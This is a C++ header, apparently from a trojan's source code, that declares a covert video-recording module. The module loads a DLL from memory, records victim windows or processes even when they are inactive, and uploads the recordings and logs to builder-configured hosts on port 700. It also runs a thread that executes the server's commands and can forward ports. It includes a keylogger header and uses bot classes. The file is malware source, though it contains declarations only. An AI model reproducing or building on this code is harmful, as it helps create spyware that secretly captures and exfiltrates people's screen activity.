#ifndef VideoRecorderH
#define VideoRecorderH
//-----------------------------------------------------------------------------

#include <windows.h>
#include "UniversalKeyLogger.h"
#include "DllLoader.h"
#include "Pipes.h"


// Настройки парметров для билдера
#define VIDEOREC_PARAM_SIZE_HOST 50
#define VIDEOREC_PARAM_SIZE_URLS 3000

#define VIDEOREC_PARAM_NAME_HOST1 "VIDEO_REC_HOST1"
#define VIDEOREC_PARAM_NAME_HOST2 "VIDEO_REC_HOST2"
#define VIDEOREC_PARAM_NAME_URLS  "VIDEO_REC_URLS\0"

#define VIDEOREC_PARAM_ENCRYPTED_HOST false
#define VIDEOREC_PARAM_ENCRYPTED_URLS false


// порт сервера приёма видео
const DWORD VIDEORECORD_DEFAULT_PORT = 700;



static const int VIDEO_FULLSCREEN	= 0x0001; //полноэкранная запись
static const int VIDEO_ALWAYS		= 0x0002; //записывать всегда, даже если окно не активно


//****************************************************
//  TVideoRecDLL - класс для работы с библиотекой
//                 видеозаписи
//****************************************************
class TVideoRecDLL : public TMemoryDLL
{
private:

	// определяем типы функций
	//функции инииализации и освобождения длл
	typedef DWORD (WINAPI *TInit)( const char* uid, int flags, const char* ip1, int port1, const char* ip2, int port2 );
	typedef void (WINAPI *TRelease)();

	//функции записи видео
	typedef VOID (WINAPI *TStartRecHwnd	)( char* uid, char* nameVideo, HWND wnd, int seconds, int flags ) ;
	typedef VOID (WINAPI *TStartRecPid  )( char* uid, char* nameVideo, DWORD pid, int seconds, int flags );
	typedef VOID (WINAPI *TStopRec		)();
	typedef VOID (WINAPI *TResetTimer	)();

	//функции отправки файлов
	typedef VOID (WINAPI *TStartSend	)( char* path );
	typedef DWORD (WINAPI *TStartSendAsync )( char* path );
	typedef DWORD (WINAPI *TIsSendedAsync )( DWORD );

	//функции передачи логов на сервер
	typedef void (WINAPI *TSendLog)( const char* name, int code, const char* text );

	//запуск потока выполнения команд сервера
	typedef DWORD (WINAPI *typeCallbackCmd)( DWORD cmd, char* inData, int lenInData, char* outData, int szOutData, DWORD* lenOutData );
	typedef VOID (WINAPI *TRunCmdExec)(typeCallbackCmd);

	void InitializeApi();
	void LoadFunc(const char* Name, LPVOID &Addr);

public:
	TVideoRecDLL();
	~TVideoRecDLL();

	TInit				Init;
	TRelease			Release;
	TStartRecHwnd		RecordWnd;
	TStartRecPid		RecordProcess;
	TStopRec			RecordStop;
	TResetTimer			ResetTimer;
	TStartSend			SendFiles;
	TStartSendAsync		StartSendAsync;
	TIsSendedAsync		IsSendedAsync;
	TRunCmdExec			RunCmdExec;
	TSendLog			SendLog;

};

namespace VideoProcess
{

//инициализирует видео длл и стартует пайп канал для приема команд на выполнение
bool Start();
//завершение работы видео процесса
void Stop();
//возвращает имя пайп канала для видео процесса
char* GetNamePipe( char* buf );

//функции через канал пайпа вызывают функции видео длл. Видео длл должна быть запущена
//в единственном экземпляре в отдельном процессе
bool RecordHWND( const char* name, HWND wnd, int seconds = 0, int flags = 0 );
bool RecordPID( const char* name, DWORD pid = 0, int seconds = 0, int flags = 0 );
void RecordStop();
DWORD SendFiles( const char* name, const char* path, bool async = false );
bool FilesIsSended(DWORD id);
bool SendLog( const char* name, int code, const char* text );

};

//класс для упрощения отправки логов, тут запоминается имя лога, чтобы не писать его в каждой строчке
class VideoLog : public TBotObject
{
		const char* name;

	public:

		VideoLog( const char* _name ) : name(_name)
		{
		}
		void Send( int code, const char* format, ... );
		void Send2(int code, const char* text )
		{
			Send2( name, code, text );
		}

		//отправка лога на сервер:
		//name - имя лога
		//code - код лога
		//format - форматированный текст лога
		static void Send( const char* name, int code, const char* format, ... );
		static void SendV( const char* name, int code, const char* format, va_list va );
		//тоже самое что и Send только без форматирования текста
		static void Send2( const char* name, int code, const char* text )
		{
			VideoProcess::SendLog( name, code, text );
		}

};

//Функция возвращает адрес сервера для записи видео
PCHAR GetVideoRecHost1();
PCHAR GetVideoRecHost2();
//запускает проброс порта, в параметрах указывается айпи видео сервера (порт сервера зашит в функции), порт который нужно 
//пробросить передаст видео сервер, эта функция запускает видео-длл и сама видео-длл ждет номер порта
//для проброса, возвращает указатель на библиотеку, чтобы удалить после использования
//TVideoRecDLL* RunPortForward( const char* ip );
//сохраняет видео-длл в указанном файле
bool SaveVideoDll( const char* nameFile );

void StartVideoFromCurrentURL();

#endif
